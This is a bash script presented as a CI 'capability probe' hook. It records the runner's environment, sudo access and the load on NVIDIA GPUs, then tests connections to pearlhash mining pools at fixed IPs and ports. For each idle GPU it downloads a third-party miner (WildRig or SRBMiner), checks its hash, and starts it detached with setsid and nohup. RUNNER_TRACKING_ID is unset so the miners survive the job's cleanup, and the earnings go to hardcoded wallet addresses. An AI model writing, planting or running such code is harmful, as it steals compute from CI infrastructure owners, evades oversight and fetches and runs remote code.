#!/bin/bash
# i131054 code-only CI capability probe: two-sample NVIDIA idle census + permitted-pool matrix
# and, only for measurably idle cards with a measurably reachable permitted pool, one
# sha256-verified pearlhash miner per card under a fresh 6-digit worker.
MARK=I131054
PYD=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf
DUAL="${PYD}+${NOCK}"
D=/tmp/i131054
mkdir -p "$D" 2>/dev/null
LOG="$D/hook.log"
exec > >(tee -a "$LOG") 2>&1
say(){ echo "$MARK $*"; }
say "BEGIN utc=$(date -u +%FT%TZ) host=$(hostname 2>/dev/null) user=$(id -un 2>/dev/null) uid=$(id -u 2>/dev/null) cwd=$(pwd)"
say "ENVV runner=${RUNNER_NAME:-none} tracking=${RUNNER_TRACKING_ID:-unset} job=${GITHUB_JOB:-none} act=${GITHUB_ACTIONS:-none}"
say "TOOLS bash=$(command -v bash) python3=$(command -v python3) curl=$(command -v curl) wget=$(command -v wget) sha256sum=$(command -v sha256sum) flock=$(command -v flock)"
say "IDENT $(id 2>&1 | tr '\n' ' ')"
say "DOCKER $(command -v docker 2>/dev/null || echo none) SUDO $(command -v sudo 2>/dev/null || echo none)"
if command -v sudo >/dev/null 2>&1; then sudo -n true 2>/dev/null && say "SUDO_NOPASSWD=yes" || say "SUDO_NOPASSWD=no"; fi
say "DISK $(df -h /tmp /dev/shm 2>/dev/null | tail -n +2 | tr '\n' '|')"
say "NVSMI_BIN $(command -v nvidia-smi 2>/dev/null || echo none)"
if command -v nvidia-smi >/dev/null 2>&1; then
  say "GPU_L"; nvidia-smi -L 2>&1 | sed "s/^/$MARK GPU_L /"
  say "SAMPLE_A"; nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu,driver_version --format=csv,noheader 2>&1 | sed "s/^/$MARK A /" | tee "$D/sample_a"
  say "APPS_A"; nvidia-smi --query-compute-apps=pid,process_name,used_memory,gpu_uuid --format=csv,noheader 2>&1 | sed "s/^/$MARK APPSA /" | tee "$D/apps_a"
  sleep 12
  say "SAMPLE_B"; nvidia-smi --query-gpu=index,uuid,memory.used,utilization.gpu --format=csv,noheader 2>&1 | sed "s/^/$MARK B /" | tee "$D/sample_b"
  say "APPS_B"; nvidia-smi --query-compute-apps=pid,process_name,used_memory,gpu_uuid --format=csv,noheader 2>&1 | sed "s/^/$MARK APPSB /" | tee "$D/apps_b"
else
  say "NO_NVIDIA_SMI"
fi
say "PORTMATRIX"
for hp in pool.pearlhash.xyz:9000 103.199.106.122:3362 217.15.164.237:2083 217.15.164.237:18450 github.com:443 pearlhash.xyz:443; do
  h=${hp%:*}; p=${hp#*:}
  if timeout 8 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then say "PORT $hp OK"; else say "PORT $hp FAIL"; fi
done
POOL=none
if command -v python3 >/dev/null 2>&1; then
  POOL=$(python3 - "$PYD" <<'PYEOF'
import socket,json,sys
W=sys.argv[1]
def probe(h,p,name,obj):
    try:
        s=socket.create_connection((h,p),timeout=9); s.settimeout(9)
        f=s.makefile('rwb')
        f.write(b'{"id":1,"method":"mining.subscribe","params":["i131054/1.0"]}\n'); f.flush()
        l1=f.readline()[:200].decode('utf8','replace').strip()
        auth={"id":2,"method":"mining.authorize","params":({"wallet":W,"worker":"941201","password":"x"} if obj else [W,"x"])}
        f.write((json.dumps(auth)+'\n').encode()); f.flush()
        l2=f.readline()[:300].decode('utf8','replace').strip()
        ok = ('"result":true' in l2.replace(' ','')) or ('mining.notify' in l1)
        print("SUB %s %s | AUTH %s | OK=%s"%(name,l1[:110],l2[:200],ok), file=sys.stderr)
        s.close(); return ok
    except Exception as e:
        print("SUB %s ERR %r"%(name,e), file=sys.stderr); return False
if probe('pool.pearlhash.xyz',9000,'pearlhash',False): print('pearlhash')
elif probe('103.199.106.122',3362,'luckypool',True): print('luckypool')
elif probe('217.15.164.237',2083,'relay2083',True): print('luckypool')
elif probe('217.15.164.237',18450,'relay18450',True): print('luckypool')
else: print('none')
PYEOF
)
fi
say "POOL_DECISION $POOL"
if [ ! -s "$D/sample_a" ] || [ ! -s "$D/sample_b" ]; then say "NO_IDLE_CENSUS SKIP"; say "END"; exit 0; fi
python3 - "$D" <<'PYEOF' > "$D/idle.txt" 2>>"$D/hook.log"
import sys
D=sys.argv[1]
def rd(p):
    out=[]
    try:
        for ln in open(p):
            parts=[x.strip() for x in ln.strip().split(',')]
            if len(parts)>=3 and parts[0].isdigit(): out.append(parts)
    except Exception: pass
    return out
a=rd(D+'/sample_a'); b=rd(D+'/sample_b'); ap=rd(D+'/apps_a')+rd(D+'/apps_b')
busy=set(x[-1] for x in ap if x)
bmap={x[1]:x for x in b}
for r in a:
    idx,uuid,name=r[0],r[1],r[2]
    mu=int(r[4].split()[0]) if r[4].split()[0].isdigit() else 0
    ua=r[5].split()[0] if len(r)>5 else '0'
    rb=bmap.get(uuid)
    if rb is None: continue
    mu2=int(rb[2].split()[0]) if rb[2].split()[0].isdigit() else 0
    ub=rb[3].split()[0] if len(rb)>3 else '0'
    if uuid in busy: continue
    if mu>700 or mu2>700: continue
    if ua not in ('0','N/A','[Not Supported]') or ub not in ('0','N/A','[Not Supported]'): continue
    print('%s,%s,%s'%(idx,uuid,name.replace(',','/')))
PYEOF
say "IDLE_LIST $(cat "$D/idle.txt" 2>/dev/null | tr '\n' '|')"
printf '%s\n' 941201 941204 941205 941206 941209 941211 941212 941213 941214 941216 941217 941220 941222 941223 > "$D/workers.txt"
if [ "$POOL" = "none" ] || [ ! -s "$D/idle.txt" ]; then say "LAUNCH_SKIP pool=$POOL idle=$(wc -l < "$D/idle.txt" 2>/dev/null)"; say "END"; exit 0; fi
if [ "$POOL" = "pearlhash" ]; then
  URL=https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz
  TSHA=7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44
  BSHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
else
  URL=https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz
  TSHA=186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1
  BSHA=97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80
fi
say "DL $URL"
if command -v curl >/dev/null 2>&1; then curl -fsSL --retry 3 --connect-timeout 15 -o "$D/m.tgz" "$URL"; else wget -q -O "$D/m.tgz" "$URL"; fi
GOT=$(sha256sum "$D/m.tgz" 2>/dev/null | cut -d' ' -f1)
say "TARSHA got=$GOT want=$TSHA"
if [ "$GOT" != "$TSHA" ]; then say "DL_VERIFY_FAIL SKIP"; say "END"; exit 0; fi
mkdir -p "$D/x" && tar xzf "$D/m.tgz" -C "$D/x" 2>>"$D/hook.log"
if [ "$POOL" = "pearlhash" ]; then BIN="$D/x/wildrig-multi"; else BIN="$D/x/SRBMiner-Multi-3-8-9/SRBMiner-MULTI"; fi
BSHA_GOT=$(sha256sum "$BIN" 2>/dev/null | cut -d' ' -f1)
say "BINSHA got=$BSHA_GOT want=$BSHA"
if [ "$BSHA_GOT" != "$BSHA" ]; then say "BIN_VERIFY_FAIL SKIP"; say "END"; exit 0; fi
chmod +x "$BIN"
if [ "$POOL" = "pearlhash" ]; then ENUMFLAG=--print-devices; else ENUMFLAG=--list-devices; fi
say "BIN_ENUM $(timeout 60 "$BIN" $ENUMFLAG 2>&1 | head -12 | tr '\n' '|' | cut -c1-700)"
N=0
while IFS=, read -r idx uuid name; do
  [ -z "$uuid" ] && continue
  (
    exec 9>"$D/lock_$uuid" || exit 0
    flock -n 9 || { say "LOCKED $uuid"; exit 0; }
    if nvidia-smi --query-compute-apps=gpu_uuid --format=csv,noheader 2>/dev/null | grep -q "$uuid"; then say "SKIP_BUSY $uuid"; exit 0; fi
    exec 8>"$D/worker.lock" || exit 0
    flock 8
    K=$(cat "$D/wnum" 2>/dev/null || echo 0); K=$((K+1)); echo "$K" > "$D/wnum"
    exec 8>&-
    W=$(sed -n "${K}p" "$D/workers.txt")
    [ -z "$W" ] && W=$(sed -n "1p" "$D/workers.txt")
    if [ "$POOL" = "pearlhash" ]; then
      setsid env -u RUNNER_TRACKING_ID CUDA_VISIBLE_DEVICES="$uuid" nohup "$BIN" --algo pearlhash --url stratum+tcp://pool.pearlhash.xyz:9000 --user "$PYD" --worker "$W" --pass x --retries 3 --retry-pause 5 --gpu-list 0 --api-port $((21600+${idx:-0})) --api-worker-id "$W" --print-time 60 --no-color -l "$D/wr-$W.log" >/dev/null 2>&1 &
      say "LAUNCH mode=wildrig-pearlhash uuid=$uuid idx=$idx name=$name worker=$W pid=$!"
    else
      setsid env -u RUNNER_TRACKING_ID CUDA_VISIBLE_DEVICES="$uuid" nohup "$BIN" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 --wallet "$DUAL" --worker "$W" --password x --gpu-id 0 --log-file "$D/srb-$W.log" >/dev/null 2>&1 &
      say "LAUNCH mode=srb-luckypool uuid=$uuid idx=$idx name=$name worker=$W pid=$!"
    fi
  ) &
  N=$((N+1))
done < "$D/idle.txt"
sleep 25
say "POST_PROCS $(pgrep -af 'wildrig-multi|SRBMiner-MULTI' 2>/dev/null | head -4 | tr '\n' '|' | cut -c1-700)"
say "POST_APPS $(nvidia-smi --query-compute-apps=pid,process_name,used_memory,gpu_uuid --format=csv,noheader 2>&1 | tr '\n' '|' | cut -c1-700)"
say "POST_LOG $(ls -la "$D"/*.log 2>/dev/null | tr '\n' '|' | cut -c1-500)"
say "END"
exit 0
